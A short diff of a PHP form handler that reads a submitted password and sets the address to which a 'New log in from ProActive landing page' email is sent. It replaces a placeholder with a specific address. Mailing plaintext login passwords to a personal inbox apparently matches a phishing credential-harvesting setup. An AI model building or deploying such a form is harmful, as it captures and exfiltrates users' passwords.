@@ -13,7 +13,7 @@ if (empty($_POST["password"])) {
     $password = $_POST["password"];
 }
 
-$EmailTo = "yourname@domain.com";
+$EmailTo = "chimmysmallz@github.com";
 $Subject = "New log in from ProActive landing page";
 
 // prepare email body text
